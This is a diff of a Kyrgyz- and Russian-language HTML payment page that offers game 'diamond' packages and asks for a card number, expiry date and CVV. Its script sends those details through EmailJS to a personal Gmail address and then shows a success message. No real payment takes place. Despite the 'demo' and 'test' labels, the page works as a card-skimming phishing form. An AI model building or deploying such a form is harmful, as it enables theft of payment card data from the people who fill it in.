@@ -120,55 +120,42 @@
 
 <
 
-<div class="demo-payment">
-  <h2>Платежный метод 💳 (Демо)</h2>
+<!DOCTYPE html>
+<html lang="ky">
+<head>
+  <meta charset="UTF-8">
+  <title>Тест Төлөм 💳</title>
+</head>
+<body>
+  <h2>Платежный метод 💳 (Тест)</h2>
   <form id="paymentForm">
     <input type="text" name="cardNumber" placeholder="Карта номери" required><br><br>
     <input type="text" name="expiry" placeholder="Мөөнөт (MM/YY)" required><br><br>
     <input type="text" name="cvv" placeholder="CVV" required><br><br>
-
-    <label for="diamonds">Алмаз пакети тандаңыз:</label><br>
-    <select name="diamonds" id="diamonds">
-      <option value="100">100 Алмаз - 60 сом</option>
-      <option value="500">500 Алмаз - 100 сом</option>
-      <option value="1000">1000 Алмаз - 200 сом</option>
-      <option value="1500">1500 Алмаз - 300 сом</option>
-    </select><br><br>
-
     <button type="submit">Төлөө</button>
   </form>
-  <p id="demoResult" style="color:#0ea5e9;"></p>
-</div>
+  <p id="result"></p>
 
-<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-<script>
-  (function(){
-     emailjs.init("Lejsdl7LbXKM0JQ6i"); // Сениң Public Key
-  })();
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    emailjs.init("ТВОЙ_PUBLIC_KEY"); // Сенин EmailJS Public Key
 
-  function isValidCard(number) {
-    return /^\d{16}$/.test(number); // 16 цифра болсо гана туура деп эсептейт
-  }
+    document.getElementById('paymentForm').addEventListener('submit', function(e){
+      e.preventDefault();
+      const cardNumber = this.cardNumber.value;
+      const expiry = this.expiry.value;
+      const cvv = this.cvv.value;
 
-  document.getElementById('paymentForm').addEventListener('submit', function(event){
-    event.preventDefault();
-    if (!isValidCard(this.cardNumber.value)) {
-      document.getElementById('demoResult').textContent = "Ошибка: карта номер ката!";
-      return;
-    }
-
-    // Демо Gmail’ге жөнөтөт
-    emailjs.send('service_id', 'template_sw2lq9e', {
-      cardNumber: this.cardNumber.value,
-      expiry: this.expiry.value,
-      cvv: this.cvv.value,
-      diamonds: this.diamonds.value,
-      to_email: 'zantoroajtmatov@gmail.com'
-    }).then(function(){
-      document.getElementById('demoResult').textContent = "Успешно прошли!";
-      document.getElementById('paymentForm').reset();
-    }, function(error){
-      document.getElementById('demoResult').textContent = "Ката кетти: " + JSON.stringify(error);
+      emailjs.send('service_id','template_id',{
+        cardNumber, expiry, cvv,
+        to_email: 'zantoroajtmatov@gmail.com'
+      }).then(function(){
+        document.getElementById('result').textContent = "Успешно прошли!";
+        document.getElementById('paymentForm').reset();
+      }, function(err){
+        document.getElementById('result').textContent = "Ката кетти: " + JSON.stringify(err);
+      });
     });
-  });
-</script>
+  </script>
+</body>
+</html>
